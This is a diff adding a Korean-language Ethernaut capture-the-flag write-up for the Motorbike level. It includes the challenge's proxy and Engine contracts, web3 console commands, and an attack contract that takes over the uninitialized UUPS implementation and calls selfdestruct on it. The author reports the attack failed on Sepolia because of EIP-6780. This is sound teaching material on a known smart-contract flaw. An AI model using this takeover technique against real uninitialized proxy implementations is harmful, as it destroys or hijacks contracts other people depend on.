@@ -3047,7 +3047,11 @@ slot이 겹치면 implementation의 일반 변수를 바꾸는 것만으로 prox
 
 ### 문제 요약
 
-작성 예정.
+프록시가 바라보는 implementation인 `Engine`을 망가뜨리면 클리어된다.
+`Motorbike`는 프록시이고, 실제 업그레이드 로직은 `Engine`에 있다.
+초기화되지 않은 `Engine`을 직접 초기화한 뒤, 업그레이드 기능으로 `selfdestruct`를 실행시키면 된다.
+
+현재 Sepolia 환경에서는 이 풀이로 클리어하지 못했다.
 
 ### 핵심
 
@@ -3058,22 +3062,202 @@ slot이 겹치면 implementation의 일반 변수를 바꾸는 것만으로 prox
 ### 소스코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+
+pragma solidity <0.7.0;
+
+import "openzeppelin-contracts-06/utils/Address.sol";
+import "openzeppelin-contracts-06/proxy/Initializable.sol";
+
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) public {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback() external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r_slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+
+        AddressSlot storage r;
+        assembly {
+            r_slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
 ```
 
 ### 풀이
 
-작성 예정.
+현재 결과부터 정리하면, 이 문제는 풀지 못했다.
+
+`Motorbike`는 EIP-1967 방식으로 implementation 주소를 저장한다.
+implementation slot은 다음 값이다.
+
+```text
+0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+```
+
+이 slot을 읽으면 실제 로직 컨트랙트인 `Engine` 주소를 알 수 있다.
+
+```javascript
+const slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+const value = await web3.eth.getStorageAt(contract.address, slot);
+const engine = "0x" + value.slice(26);
+engine;
+```
+
+취약점은 `Engine` 자체가 초기화되지 않았다는 점이다.
+`Motorbike` 생성자에서 `initialize()`를 `delegatecall`로 실행했기 때문에 프록시 storage만 초기화된다.
+그래서 `Engine` 주소로 직접 `initialize()`를 호출하면 내 주소가 `upgrader`가 된다.
+
+그 다음 `upgradeToAndCall()`을 호출한다.
+이 함수는 새 implementation 주소를 저장한 뒤, 넘겨준 calldata를 `delegatecall`로 실행한다.
+새 implementation에 `destroy()` 함수를 만들어두고, 그 함수를 호출하게 하면 `Engine` 컨텍스트에서 `selfdestruct`가 실행된다.
+
+흐름은 다음과 같다.
+
+1. EIP-1967 slot에서 `Engine` 주소를 찾는다.
+2. `Engine.initialize()`를 직접 호출해 `upgrader`가 된다.
+3. `DestroyEngine`을 배포한다.
+4. `Engine.upgradeToAndCall(destroyAddress, destroyData)`를 호출한다.
+5. `Engine` 코드가 사라지면 성공이다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity <0.7.0;
+
+interface IEngine {
+    function initialize() external;
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+
+contract MotorbikeAttack {
+    function attack(address engine) external {
+        IEngine(engine).initialize();
+
+        DestroyEngine destroyEngine = new DestroyEngine();
+        IEngine(engine).upgradeToAndCall(
+            address(destroyEngine),
+            abi.encodeWithSignature("destroy()")
+        );
+    }
+}
+
+contract DestroyEngine {
+    function destroy() external {
+        selfdestruct(msg.sender);
+    }
+}
 ```
+
+콘솔에서 `Engine` 주소를 구한다.
+
+```javascript
+const slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+const value = await web3.eth.getStorageAt(contract.address, slot);
+const engine = "0x" + value.slice(26);
+engine;
+```
+
+Remix에서 `MotorbikeAttack`을 배포한 뒤 `attack(engine)`을 실행한다.
+실행 후 `Engine` 코드가 없어졌는지 확인한다.
+
+```javascript
+await web3.eth.getCode(engine);
+```
+
+결과가 `0x`이면 성공이다.
+하지만 실제 Sepolia에서 실행했을 때 `getCode(engine)` 결과가 `0x`가 아니었다.
+
+EIP-6780 이후에는 이미 배포되어 있던 컨트랙트에 `selfdestruct`를 실행해도 코드가 삭제되지 않기 때문이다.
+즉 공격 흐름은 문제 의도상 맞지만, 현재 네트워크 동작 때문에 공식 클리어까지 가지 못했다.
 
 ### 정리
 
-작성 예정.
+프록시를 초기화했다고 implementation까지 초기화되는 것은 아니다.
+UUPS 계열 구조에서는 implementation 컨트랙트를 직접 초기화할 수 없도록 배포 직후 잠가야 한다.
+초기화되지 않은 implementation은 공격자가 업그레이드 권한을 가져가서 파괴할 수 있다.
+다만 Sepolia 최신 환경에서는 EIP-6780 때문에 `selfdestruct`가 기존 컨트랙트 코드를 지우지 않는다.
+그래서 이번 환경에서는 25번을 클리어하지 못했다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="DoubleEntryPoint" markdown="1">
